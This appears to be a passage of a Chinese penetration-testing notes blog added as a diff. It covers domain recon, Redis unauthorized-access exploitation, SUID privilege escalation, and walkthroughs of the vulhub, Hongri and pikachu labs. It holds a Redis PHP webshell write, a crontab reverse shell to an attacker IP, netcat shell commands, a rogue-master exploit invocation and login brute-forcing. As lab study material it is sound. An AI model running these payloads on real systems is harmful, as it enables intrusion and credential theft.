查看test域中的机器列表</span><br><span class="line">wmic useraccount get Caption,sid    获取域内所有用户sid</span><br><span class="line">setspn -T target.com -Q */*     获取当前域内所有spn</span><br><span class="line">for /l %i in (1,1,255) do @ping 192.168.0.%i -w 1 -n 1 | find /i&quot;ttl&quot;</span><br><span class="line">for /l %i in (1,1,255) do @ping 10.10.10.%i -w 1 -n 1 | find /i&quot;ttl&quot;</span><br></pre></td></tr></table></figure>
+
+<h5 id="网络信息查找"><a href="#网络信息查找" class="headerlink" title="网络信息查找"></a>网络信息查找</h5><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">ipconfig /all   查看当前主机的主机名/IP/DNS等信息</span><br><span class="line">route print 查看路由表信息</span><br><span class="line">netstat -ano    查看端口开放情况，有些时候能获取到别的IP段</span><br><span class="line">arp -a  查看arp解析情况</span><br></pre></td></tr></table></figure>
+
+<p>寻找内网网段时建议被动寻找，主动寻找动静太大，如nmap、nbtscan这种一扫，可能整个网段内存活的机器就出来了，但随之而来的是IDS的流量审计，一旦引起流量异常被蓝队察觉，可能就会导致我们权限的丢失，永远不要小瞧蓝队，而且还是拥有各种安全设备的蓝队，内网渗透一定要谨慎，大规模资产扫描，自动化漏洞扫描我一般会留到最后才上的。</p>
+<h5 id="定位域控"><a href="#定位域控" class="headerlink" title="定位域控"></a>定位域控</h5><p>查看域时间，一般域控会做时间服务器</p>
+<p><code>net time /domain</code></p>
+<p>通过dns定位域控</p>
+<p><code>ipconfig /allipconfig /displaydns   有些时候可以在dns缓存得到域控信息</code></p>
+<p>利用netdom获取域控列表，得到域控名称可通过ping获取域控IP</p>
+<p><code>netdom query dc</code></p>
+<h5 id="其它信息查找"><a href="#其它信息查找" class="headerlink" title="其它信息查找"></a>其它信息查找</h5><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">systeminfo  查看补丁情况，也能看到当前机器是否加入域环境</span><br><span class="line">net group &quot;domain controllers&quot; /domain  查询域控</span><br><span class="line">nslookup -type=SRV _ldap._tcp.corp  通过srv记录获取域控地址</span><br><span class="line">nltest /dclist:corp     使用nltest查询域控列表</span><br><span class="line">tasklist /svc   查看进程及对应服务名</span><br><span class="line">cmdkey /l   查看当前保存的登陆凭证</span><br><span class="line">type c:\Windows\system32\drivers\etc\hosts  可以发现些内网IP</span><br></pre></td></tr></table></figure>
+
+<h3 id="windows重要文件位置"><a href="#windows重要文件位置" class="headerlink" title="windows重要文件位置"></a>windows重要文件位置</h3><p>Windows系统日志存放在 C:\Windows\System32\winevt\Logs\目录下，使用系统自带的【事件查看器】来查看</p>
+<h4 id="web日志"><a href="#web日志" class="headerlink" title="web日志"></a>web日志</h4><p>有些老系统会使用get+明文的方式传输后台登录账号密码，我们可翻查下web日志，说不定有收获，还有就是要注意系统本身的日志，这些日志大多包含内网IP段，甚至还有账号密码这些东西</p>
+<h3 id="linux重要文件位置"><a href="#linux重要文件位置" class="headerlink" title="linux重要文件位置"></a>linux重要文件位置</h3><h4 id="myself"><a href="#myself" class="headerlink" title="myself"></a>myself</h4><p><code>/root/.zsh_history</code> kail命令历史命令目录</p>
+<h4 id="搜索"><a href="#搜索" class="headerlink" title="搜索"></a>搜索</h4><h3 id="提权"><a href="#提权" class="headerlink" title="提权"></a>提权</h3><ul>
+<li>mysql UDF提权，详见我写的sql那篇文章</li>
+</ul>
+<h4 id="藏牛提权"><a href="#藏牛提权" class="headerlink" title="藏牛提权"></a>藏牛提权</h4><h4 id="redis利用"><a href="#redis利用" class="headerlink" title="redis利用"></a>redis利用</h4><ul>
+<li>redis未授权访问</li>
+</ul>
+<p>漏洞利用条件</p>
+<ol>
+<li>redis绑定在 0.0.0.0:6379，且没有进行添加防火墙规则避免其他非信任来源ip访问等相关安全策略，直接暴露在公网。</li>
+<li>没有设置密码认证（一般为空），可以免密码远程登录redis服务。</li>
+</ol>
+<p>Redis自身提供了一个config的命令,用来实现备份功能，然后备份的文件名和备份的路径都可以通过</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">config set dbfilename</span><br><span class="line">config set dir</span><br></pre></td></tr></table></figure>
+
+<p>一般就可以通过这个命令，进行任意文件写的功能</p>
+<h5 id="redis详解"><a href="#redis详解" class="headerlink" title="redis详解"></a>redis详解</h5><p>Redis是C语言开发一个开源(遵循BSD)协议高性能的(key-value)键值对的内存NoSQL数据库,可以用作数据库、缓存、信息中间件(性能非常优秀，支持持久化到硬盘且高可用)，由于其自身特点，可以广泛应用在数据集群，分布式队列，信息中间件等网络架构中，在内网渗透的突破中，常常扮演getshell的角色，</p>
+<h6 id="常见的出现的问题"><a href="#常见的出现的问题" class="headerlink" title="常见的出现的问题"></a>常见的出现的问题</h6><ul>
+<li>无密码导致信息泄露</li>
+</ul>
+<p><img src="https://cdn.jsdelivr.net/gh/Daylovef/image/image/dongman/20240528112005.png" alt="20240528112005"></p>
+<p>版本比较高</p>
+<p><img src="https://cdn.jsdelivr.net/gh/Daylovef/image/image/dongman/20240528112153.png" alt="20240528112153"></p>
+<h5 id="ubuntu-安装-redis"><a href="#ubuntu-安装-redis" class="headerlink" title="ubuntu 安装 redis"></a>ubuntu 安装 redis</h5><p>想要实战一下redis未授权，但是kail的权限有问题，于是安装一下ubuntu</p>
+<p><code>apt install redis</code> 安装redis</p>
+<p><img src="https://cdn.jsdelivr.net/gh/Daylovef/image/image/dongman/20240528105914.png" alt="20240528105914"></p>
+<p><code>netstat -anp | grep redis</code>检验是否安装成功</p>
+<p><img src="https://cdn.jsdelivr.net/gh/Daylovef/image/image/dongman/20240528110124.png" alt="20240528110124"></p>
+<p>修改配置文件给予root权限</p>
+<p><img src="https://cdn.jsdelivr.net/gh/Daylovef/image/image/dongman/20240528110218.png" alt="20240528110218"></p>
+<p><img src="https://cdn.jsdelivr.net/gh/Daylovef/image/image/dongman/20240528110541.png" alt="20240528110541"><br>然后以root用户启动的,只能用bind的ip，external ip是会被拒绝的。所以我们需要把只能够127.0.0.1这个ip修改为0.0.0.1<br>将我所指的地方注释，再修改，然后保存</p>
+<p>重新启动服务器<br><code>service redis-server restart</code><br>查看当前 redis 服务器的运行状态，看是否成功<br><code>service redis-server status</code></p>
+<p><img src="https://cdn.jsdelivr.net/gh/Daylovef/image/image/dongman/20240528110844.png" alt="20240528110844"></p>
+<p>攻击机连接成功<br><img src="https://cdn.jsdelivr.net/gh/Daylovef/image/image/dongman/20240528110951.png" alt="20240528110951"></p>
+<h5 id="写入公钥SSH"><a href="#写入公钥SSH" class="headerlink" title="写入公钥SSH"></a>写入公钥SSH</h5><p>当Redis服务存在未授权访问漏洞时，攻击者可以利用该漏洞通过Redis提供的config命令进行写文件操作。攻击者可以将自己的SSH公钥写入目标服务器的特定文件，如&#x2F;root&#x2F;.ssh文件夹的authorized_keys文件。一旦攻击者成功将自己的公钥写入该文件，他们可以使用对应的私钥直接使用SSH服务登录目标服务器。</p>
+<p>前提：<br>1.对方服务器开启了ssh服务，支持ssh远程登录<br>2.对方redis服务以root权限启动，这样才有权限写权限</p>
+<p><code>flushall</code> 命令会清空所有缓存数据,这个在一定程度不会造成巨大的损失，但是会给业务体验带来影响。</p>
+<p>redis 默认数据库有16个:<br><code>config get databases</code> 就可以看到<br>默认保存的是当前数据库下内容,所以我们完全不用flushall来清空默认0号的数据库内容<br>我们只需select 去切换其他的空数据库,然后就可以了。</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">select 5</span><br><span class="line">set 1 &#x27;&lt;?php eval($_POST[&quot;cmd&quot;]);?&gt;&#x27;</span><br><span class="line">config set dir /var/www/html</span><br><span class="line">config set dbfilename shell.php</span><br><span class="line">save</span><br></pre></td></tr></table></figure>
+
+<p><code>keys *</code>，先知上面说，最好不要用但我还是试了一下，完全没有影响,显示这个数据库是空的</p>
+<p><code>dbsize</code>查看数据库大小</p>
+<p><img src="https://cdn.jsdelivr.net/gh/Daylovef/image/image/dongman/20240528114956.png" alt="20240528114956"></p>
+<p>我们用select去寻找一个空的数据库，然后使用我们想要写入的webshell</p>
+<p>因为我的靶机并没有web服务，我就写一个hello,world</p>
+<p>ubuntu的写入有问题，禁止使用了dir，和dbfilename<br><img src="https://cdn.jsdelivr.net/gh/Daylovef/image/image/dongman/20240528115646.png" alt="20240528115646"></p>
+<p>因为无法使用dir和dbfilename，所以可以肯定计划任务反弹shell，也是没有办法完成的</p>
+<p><code>ssh-keygen -t rsa #生成一对rsa密钥文件</code></p>
+<h5 id="利用crontab反弹shell"><a href="#利用crontab反弹shell" class="headerlink" title="利用crontab反弹shell"></a>利用crontab反弹shell</h5><p><img src="https://cdn.jsdelivr.net/gh/Daylovef/image/image/dongman/20240527182435.png" alt="20240527182435"></p>
+<p>监听端口,写入计划任务（连接时需要以root用户身份）：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">config set dir /var/spool/cron/crontabs</span><br><span class="line">config set dbfilename root</span><br><span class="line">set xxx &quot;\n\n\n*/1 * * * * /bin/bash -i&gt;&amp;/dev/tcp/192.168.1.143/4444 0&gt;&amp;1\n\n\n&quot;</span><br><span class="line">save</span><br></pre></td></tr></table></figure>
+
+
+
+<h5 id="主从复制反弹shell"><a href="#主从复制反弹shell" class="headerlink" title="主从复制反弹shell"></a>主从复制反弹shell</h5><ul>
+<li>主从复制是什么</li>
+</ul>
+<p>redis主从复制我们简单理解为有两台redis服务器,一个是主，一个是从，两台服务器的数据是一样的，主服务器负责写入数据，从服务器负责读取数据。一般一个主服务器有好几个从服务器，且从服务器可能也是其他redis服务器的主服务器。这样的好处就是如果主服务器或者一个从服务器崩溃不会影响数据完整性，且读写分开，减轻服务器压力。</p>
+<ul>
+<li>主从复制反弹shell</li>
+</ul>
+<p>网上有一个主从复制的python利用脚本</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">git clone https://github.com/vulhub/redis-rogue-getshell.git</span><br><span class="line">cd redis-rogue-getshell/RedisModulesSDK/exp</span><br><span class="line">make //在当前目录下生成一个exp.so文件</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://cdn.jsdelivr.net/gh/Daylovef/image/image/dongman/20240527181022.png" alt="20240527181022"></p>
+<p>回到redis-rogue-getshell目录下，利用EXP</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">./redis-master.py -r 192.168.233.136 -p 6379 -L 192.168.233.110 -P 1111 -f RedisModulesSDK/exp/exp.so -c &quot;id&quot;  </span><br><span class="line">//第一个ip是靶机，第二个ip是攻击机</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://cdn.jsdelivr.net/gh/Daylovef/image/image/dongman/20240527182102.png" alt="20240527182102"></p>
+<p>利用成功</p>
+<h5 id="利用msf破解redis密码"><a href="#利用msf破解redis密码" class="headerlink" title="利用msf破解redis密码"></a>利用msf破解redis密码</h5><p>现在一般redis密码，一般都会设计密码，但是kail的msf模块，可以去破解简单的redis密码</p>
+<h5 id=""><a href="#" class="headerlink" title=""></a></h5><h4 id="suid提权"><a href="#suid提权" class="headerlink" title="suid提权"></a>suid提权</h4><p>SUID是一种对二进制程序进行设置的特殊权限，可以让二进制程序的执行者临时拥有属主的权限，若是对一些特殊命令设置了SUID，那么将会有被提权的风险，常用的SUID提权命令有nmap、vim、find、bash、more、less、nano和cp等。</p>
+<p>主要就是利用一些root账户给某些命令，能够以root权限去执行的命令，而且这个命名可以去访问一个shell</p>
+<p>然后就会出现这个shell，权限等级是root，常见的允许提权，的linux可执行文件有</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line">Nmap (版本不能过高 2.02 - 5.21)</span><br><span class="line">nmap --interactive</span><br><span class="line">nmap&gt; !sh</span><br><span class="line"></span><br><span class="line">Vim 编辑文件，退出的模式选择 :shell 就可以进入shell</span><br><span class="line">vim.tiny /etc/shadow</span><br><span class="line"></span><br><span class="line">find 操作</span><br><span class="line"># 寻找权限为4000的文件</span><br><span class="line">find / -user root -perm -4000 -print 2&gt;/dev/null</span><br><span class="line">find / -perm -u=s -type f 2&gt;/dev/null</span><br><span class="line">find / -user root -perm -4000 -exec ls -ldb &#123;&#125; \;</span><br><span class="line"># 创建文件，将文件作为shell打开</span><br><span class="line">touch pentestlab</span><br><span class="line">find pentestlab -exec whoami \;</span><br><span class="line">#find写入反弹shell</span><br><span class="line">find pentestlab -exec netcat -lvp 5555 -e /bin/sh \;</span><br><span class="line"></span><br><span class="line">Bash 直接-p 进入shell</span><br><span class="line">bash -p</span><br><span class="line"></span><br><span class="line">More</span><br><span class="line"></span><br><span class="line">Less </span><br><span class="line">less /etc/passwd</span><br><span class="line">!/bin/sh</span><br><span class="line"></span><br><span class="line">Nano</span><br><span class="line">cp</span><br></pre></td></tr></table></figure>
+
+<p><a target="_blank" rel="noopener" href="https://pentestlab.blog/2017/09/25/suid-executables/">借鉴的github博客</a></p>
+<p>设置SUID</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">chmod u+s filename设置SUID位</span><br><span class="line">chmod u-s filename去掉SUID设置</span><br></pre></td></tr></table></figure>
+
+<h5 id="2024-1版本-kail-提权操作尝试"><a href="#2024-1版本-kail-提权操作尝试" class="headerlink" title="2024.1版本 kail 提权操作尝试"></a>2024.1版本 kail 提权操作尝试</h5><p>为了实验，我们先把权限给上<br><code>chmod u+s /bin/命令名</code></p>
+<ul>
+<li>find 命令寻找具有SUID权限的文件</li>
+</ul>
+<p><code>find / -user root -perm -4000 -print 2&gt;/dev/null</code></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">/ :代表根目录，也就是说从根目录开始查找</span><br><span class="line">-user ：按文件属主类型查找</span><br><span class="line">-perm：按文件权限来查找，4000，2000,1000为分别表示SUID,SGID,SBIT</span><br><span class="line">-print：将匹配到的文件进行标准输出</span><br><span class="line">2&gt;/dev/null : 2代表标准错误输出（文件描述符的一种），&gt;代表输出重定向，/dev/null是一个特殊的文件，输出到此文件的东西都会被丢弃，你为可以理解为垃圾桶</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://cdn.jsdelivr.net/gh/Daylovef/image/image/dongman/20240516113312.png" alt="20240516113312"></p>
+<p>发现find，尝试提权</p>
+<p><img src="https://cdn.jsdelivr.net/gh/Daylovef/image/image/dongman/20240516113505.png" alt="20240516113505"></p>
+<p>kail直接禁用了exec，提权失败</p>
+<p>尝试nc反弹shell<br><code>find shell -exec netcat -lvp 5555 -e /bin/sh \;</code></p>
+<p><img src="https://cdn.jsdelivr.net/gh/Daylovef/image/image/dongman/20240516115223.png" alt="20240516115223"></p>
+<p>依旧失败</p>
+<p><img src="https://cdn.jsdelivr.net/gh/Daylovef/image/image/dongman/20240516115300.png" alt="20240516115300"></p>
+<ul>
+<li>bash</li>
+</ul>
+<p><img src="https://cdn.jsdelivr.net/gh/Daylovef/image/image/dongman/20240516113634.png" alt="20240516113634"></p>
+<p>提权成功</p>
+<ul>
+<li>less</li>
+</ul>
+<p>给了但是我这里依旧提权失败，可能是以为kail有什么保护机制吧</p>
+<ul>
+<li>vim</li>
+</ul>
+<p><img src="https://cdn.jsdelivr.net/gh/Daylovef/image/image/dongman/20240516115448.png" alt="20240516115448"></p>
+<p>依旧没有办法提权成功</p>
+<h3 id="webshell-免杀"><a href="#webshell-免杀" class="headerlink" title="webshell 免杀"></a>webshell 免杀</h3><h2 id="parctice"><a href="#parctice" class="headerlink" title="parctice"></a>parctice</h2><h3 id="靶场实战"><a href="#靶场实战" class="headerlink" title="靶场实战"></a>靶场实战</h3><h4 id="红日靶场"><a href="#红日靶场" class="headerlink" title="红日靶场"></a>红日靶场</h4><h5 id="环境搭建"><a href="#环境搭建" class="headerlink" title="环境搭建"></a>环境搭建</h5><ol>
+<li>配置网卡</li>
+</ol>
+<p><img src="https://cdn.jsdelivr.net/gh/Daylovef/image/image/dongman/20240520122325.png" alt="20240520122325"></p>
+<p>修改ip，添加网卡<br>可以修改为自己的ip，或者使用DHCP自己分配的ip</p>
+<ol start="2">
+<li>直接将下载的压缩包解压出来，使用vm打开，记住虚拟机需要全部开启</li>
+</ol>
+<p><img src="https://cdn.jsdelivr.net/gh/Daylovef/image/image/dongman/20240520134712.png" alt="20240520134712"></p>
+<ol start="3">
+<li>web-centos<br><code>进去第一条命令 service network restart 重启网络服务</code></li>
+</ol>
+<h5 id="信息收集"><a href="#信息收集" class="headerlink" title="信息收集"></a>信息收集</h5><p>知道了ip，并且为真实的IP，我们直接先扫端口，看有没有启动的什么服务之类的</p>
+<p>![20240520140010](<a target="_blank" rel="noopener" href="https://cdn.jsdelivr.net/gh/Daylovef">https://cdn.jsdelivr.net/gh/Daylovef</a>  &#x2F;image&#x2F;image&#x2F;dongman&#x2F;20240520140010.png)</p>
+<p>80端口开放http服务</p>
+<ul>
+<li>指纹识别</li>
+</ul>
+<p><img src="https://cdn.jsdelivr.net/gh/Daylovef/image/image/dongman/20240520153515.png" alt="20240520153515"></p>
+<p>识别出来为<code>Joomla</code></p>
+<h5 id="web-centos渗透"><a href="#web-centos渗透" class="headerlink" title="web-centos渗透"></a>web-centos渗透</h5><p>同样也可以使用谷歌插件来查看</p>
+<p><img src="https://cdn.jsdelivr.net/gh/Daylovef/image/image/dongman/20240520153637.png" alt="20240520153637"></p>
+<p>网上搜索<code>Joomla</code>的CVE</p>
+<p>但是我们目前不知道是什么版本,所以可以尝试扫一下目录，看有没有一些文件会去证明版本</p>
+<p>直接使用dirmap跑<br><img src="https://cdn.jsdelivr.net/gh/Daylovef/image/image/dongman/20240520154156.png" alt="20240520154156"></p>
+<p>发现有很多文件,后台文件也扫到了</p>
+<p>可以去尝试读取readme和htaccess，发现版本很低</p>
+<p><img src="https://cdn.jsdelivr.net/gh/Daylovef/image/image/dongman/20240520155257.png" alt="20240520155257"></p>
+<p>搜到了<code>CVE-2015-8562</code> 影响版本 Joomla 1.5.x, 2.x, and 3.x before 3.4.6<br><code>CVE-2017-8917</code> 影响版本 Joomla 3.7.0</p>
+<p>直接使用<code>auxtools</code>验证一下</p>
+<p><img src="https://cdn.jsdelivr.net/gh/Daylovef/image/image/dongman/20240520174434.png" alt="20240520174434"></p>
+<p>没有找到能用的</p>
+<p>这个项目是开源的，可以去尝试白盒，自己找一些能打的洞。</p>
+<p><code>Joomla提权漏洞 (CVE-2020-11890)</code><br>这是一个提权漏洞,但是需要一个管理员账号，这条路打不通</p>
+<p>但是这个web还开启了一个服务，mysql，看一下有没有弱密码</p>
+<p><img src="https://cdn.jsdelivr.net/gh/Daylovef/image/image/dongman/20240520161404.png" alt="20240520161404"></p>
+<p>直接就有，mysql弱密码</p>
+<p><code> mysql -h 192.168.93.100 -u root -p</code> 远程连接上数据库</p>
+<p><img src="https://cdn.jsdelivr.net/gh/Daylovef/image/image/dongman/20240520161928.png" alt="20240520161928"></p>
+<p>尝试命令执行</p>
+<p><img src="https://cdn.jsdelivr.net/gh/Daylovef/image/image/dongman/20240520162139.png" alt="20240520162139"></p>
+<p>不行，看一下help</p>
+<p><img src="https://cdn.jsdelivr.net/gh/Daylovef/image/image/dongman/20240520162523.png" alt="20240520162523"></p>
+<p>没有命令执行,尝试写入webshell</p>
+<p><img src="https://cdn.jsdelivr.net/gh/Daylovef/image/image/dongman/20240520165428.png" alt="20240520165428"></p>
+<p>没有权限,一般写入webshell都需要root权限</p>
+<p>那就查看以下mysql有没有敏感文件泄露</p>
+<p>找一个像一点的表，<br><img src="https://cdn.jsdelivr.net/gh/Daylovef/image/image/dongman/20240520211554.png" alt="20240520211554"></p>
+<p>拿到了密码<code>$2y$10$N/Yv/9rzxyq.z0gLTT5og.pj3FFAP8Sq2PcBgsMX/Qnc2671qQkHy</code></p>
+<p><img src="https://cdn.jsdelivr.net/gh/Daylovef/image/image/dongman/20240520212225.png" alt="20240520212225"></p>
+<p>使用kail破解密码</p>
+<p><img src="https://cdn.jsdelivr.net/gh/Daylovef/image/image/dongman/20240520224317.png" alt="20240520224317"></p>
+<p>破解失败，看有没有其他方式</p>
+<p>发现<code>/configuration.php~</code> 有密码泄露</p>
+<p><img src="https://cdn.jsdelivr.net/gh/Daylovef/image/image/dongman/20240520213254.png" alt="20240520213254"></p>
+<p><img src="https://cdn.jsdelivr.net/gh/Daylovef/image/image/dongman/20240520213555.png" alt="20240520213555"></p>
+<p>登录失败</p>
+<p><img src="https://cdn.jsdelivr.net/gh/Daylovef/image/image/dongman/20240520213626.png" alt="20240520213626"></p>
+<p>前台同样登录失败</p>
+<p>但是这里我忽然发现一个点，就是我们连接root的数据库的时候发现了，这个同样的邮箱，这个泄露的会不会是拥有root权限的mysql数据库用户呢</p>
+<p><code>mysql -h 192.168.93.100 -u testuser -p</code><br>尝试连接</p>
+<p><img src="https://cdn.jsdelivr.net/gh/Daylovef/image/image/dongman/20240520224549.png" alt="20240520224549"></p>
+<p>成功连接,继续尝试写入webshell,猜测以下文件路径，还是不被允许</p>
+<p><img src="https://cdn.jsdelivr.net/gh/Daylovef/image/image/dongman/20240520225220.png" alt="20240520225220"></p>
+<p>那么我能不能通过添加数据库的账号密码，来登录后台呢</p>
+<p><img src="https://cdn.jsdelivr.net/gh/Daylovef/image/image/dongman/20240520225509.png" alt="20240520225509"></p>
+<p>尝试观察这几个表的联系</p>
+<h4 id="vulhub靶场"><a href="#vulhub靶场" class="headerlink" title="vulhub靶场"></a>vulhub靶场</h4><h5 id="log4j漏洞-JNDI注入"><a href="#log4j漏洞-JNDI注入" class="headerlink" title="log4j漏洞 (JNDI注入)"></a>log4j漏洞 (JNDI注入)</h5><ul>
+<li>漏洞产生原因</li>
+</ul>
+<p>在Log4j2中提供了Lookups机制，Lookups提供了一种在Log4j配置文件任意位置添加值的方法；而Lookups机制中，存在JNDI，在Log4j日志输出时，未对字符合法性进行严格的限制，造成JNDI协议加载的远程恶意脚本被执行，从而造成RCE。</p>
+<h5 id="redis未授权访问"><a href="#redis未授权访问" class="headerlink" title="redis未授权访问"></a>redis未授权访问</h5><p>Redis 默认情况下，会绑定在 0.0.0.0:6379，如果没有进行采用相关的策略，比如添加防火墙规则避免其他非信任来源 ip 访问等，这样将会将 Redis 服务暴露到公网上；如果在没有设置密码认证（一般为空）的情况下，会导致任意用户在可以访问目标服务器的情况下未授权访问 Redis 以及读取 Redis 的数据。攻击者在未授权访问 Redis 的情况下，利用 Redis 自身的提供的config 命令，可以进行写文件操作，攻击者可以成功将自己的ssh公钥写入目标服务器的 &#x2F;root&#x2F;.ssh 文件夹的authotrized_keys 文件中，进而可以使用对应私钥直接使用ssh服务登录目标服务器、添加计划任务、写入Webshell等操作。</p>
+<p>vulhub靶场默认的是6379端口</p>
+<p><code>cd /vulhub/redis/4-unacc</code></p>
+<p><code>docker-compose up -d</code></p>
+<p>使用docker开启靶机</p>
+<p><img src="https://cdn.jsdelivr.net/gh/Daylovef/image/image/dongman/20240515230334.png" alt="20240515230334"></p>
+<p>下载完成</p>
+<p><img src="https://cdn.jsdelivr.net/gh/Daylovef/image/image/dongman/20240515230419.png" alt="20240515230419"></p>
+<p>容器启动成功</p>
+<h6 id="redis未授权利用"><a href="#redis未授权利用" class="headerlink" title="redis未授权利用"></a>redis未授权利用</h6><p>redis的靶场，那肯定是需要对靶机进行扫描,确定开启redis服务才能够进行攻击</p>
+<p>nmap半开扫描全部端口<br><code>nmap -sV 172.29.140.5 -p 1-65535</code><br><code>nmap -sV -p- 172.29.140.5</code></p>
+<p><img src="https://cdn.jsdelivr.net/gh/Daylovef/image/image/dongman/20240527173827.png" alt="20240527173827"></p>
+<p>扫描成功，的确有redis服务，尝试直接连接</p>
+<p>攻击机安装<code>redis-cli</code></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">wget http://download.redis.io/redis-stable.tar.gz</span><br><span class="line">tar -zxvf redis-stable.tar.gz</span><br><span class="line">cd redis-stable</span><br><span class="line">make</span><br><span class="line">cp src/redis-cli /usr/bin/ #将redis的命令移动到命令文件夹</span><br><span class="line">redis-cli -h </span><br></pre></td></tr></table></figure>
+<p><img src="https://cdn.jsdelivr.net/gh/Daylovef/image/image/dongman/20240527173542.png" alt="20240527173542"></p>
+<p>未授权连接<br><code>redis-cli -h 172.29.140.5</code><br><img src="https://cdn.jsdelivr.net/gh/Daylovef/image/image/dongman/20240527175741.png" alt="20240527175741"></p>
+<p><img src="https://cdn.jsdelivr.net/gh/Daylovef/image/image/dongman/20240527181022.png" alt="20240527181022"></p>
+<p>回到redis-rogue-getshell目录下，利用EXP</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">./redis-master.py -r 192.168.233.136 -p 6379 -L 192.168.233.110 -P 1111 -f RedisModulesSDK/exp/exp.so -c &quot;id&quot;  </span><br><span class="line">//第一个ip是靶机，第二个ip是攻击机</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://cdn.jsdelivr.net/gh/Daylovef/image/image/dongman/20240527182102.png" alt="20240527182102"></p>
+<p>利用成功</p>
+<p>由于该容器并没有ssh，也没有root权限，所以仅可以通过</p>
+<h4 id="portswigger靶场"><a href="#portswigger靶场" class="headerlink" title="portswigger靶场"></a>portswigger靶场</h4><p><a target="_blank" rel="noopener" href="https://portswigger.net/web-security/all-labs#business-logic-vulnerabilities">portswigger靶场</a></p>
+<h5 id="-1"><a href="#-1" class="headerlink" title=""></a></h5><h4 id="pikachu"><a href="#pikachu" class="headerlink" title="pikachu"></a>pikachu</h4><h5 id="密码爆破"><a href="#密码爆破" class="headerlink" title="密码爆破"></a>密码爆破</h5><h6 id="图形验证码"><a href="#图形验证码" class="headerlink" title="图形验证码"></a>图形验证码</h6><p>直接先burp抓包</p>
+<p><img src="https://cdn.jsdelivr.net/gh/Daylovef/image/image/dongman/20240515175507.png" alt="20240515175507"></p>
+<p>然后输入验证码，多次发包</p>
+<p>当验证码正确之后，发现每一回发包,验证码都没有变化</p>
+<p><img src="https://cdn.jsdelivr.net/gh/Daylovef/image/image/dongman/20240515175636.png" alt="20240515175636"></p>
+<p>只是说账号密码错误，只要session不变就可以一直爆破，而且对于账号密码错误并不会有时间限制</p>
+<p>那现在就去攻击模块，选择爆破模式,集束爆破,</p>
+<p><img src="https://cdn.jsdelivr.net/gh/Daylovef/image/image/dongman/20240515180823.png" alt="20240515180823"></p>
+<p>成功爆破三组账号,密码</p>
+<p>漏洞成因，因为session不变，只要不去刷新页面，验证码就不会修改，到可以可以尝试爆破</p>
+<h6 id="暴力破解-验证码绕过"><a href="#暴力破解-验证码绕过" class="headerlink" title="暴力破解 (验证码绕过)"></a>暴力破解 (验证码绕过)</h6><p>纯表单暴力破解就不打了，太简单了</p>
+<p>这一关直接，验证码验证在前端，</p>
+<p><img src="https://cdn.jsdelivr.net/gh/Daylovef/image/image/dongman/20240522131126.png" alt="20240522131126"></p>
+<p>包都没抓包，就验证码错误了</p>
+<p><img src="https://cdn.jsdelivr.net/gh/Daylovef/image/image/dongman/20240522131238.png" alt="20240522131238"></p>
+<p>直接置空，暴力破解</p>
+<p><img src="https://cdn.jsdelivr.net/gh/Daylovef/image/image/dongman/20240522131334.png" alt="20240522131334"></p>
+<h6 id="token防爆破"><a href="#token防爆破" class="headerlink" title="token防爆破?"></a>token防爆破?</h6><p><img src="https://cdn.jsdelivr.net/gh/Daylovef/image/image/dongman/20240522132152.png" alt="20240522132152"></p>
+<p>发现token</p>
+<p><img src="https://cdn.jsdelivr.net/gh/Daylovef/image/image/dongman/20240522132332.png" alt="20240522132332"></p>
+<p>token字段就使用正则的字典,打开设置</p>
+<p>开启重定向，点击add<br><img src="https://cdn.jsdelivr.net/gh/Daylovef/image/image/dongman/20240522132805.png" alt="20240522132805"></p>
+<p><img src="https://cdn.jsdelivr.net/gh/Daylovef/image/image/dongman/20240522132735.png" alt="20240522132735"></p>
+<p>线程选项要更改一下， 设为单线程，然后直接开始爆破</p>
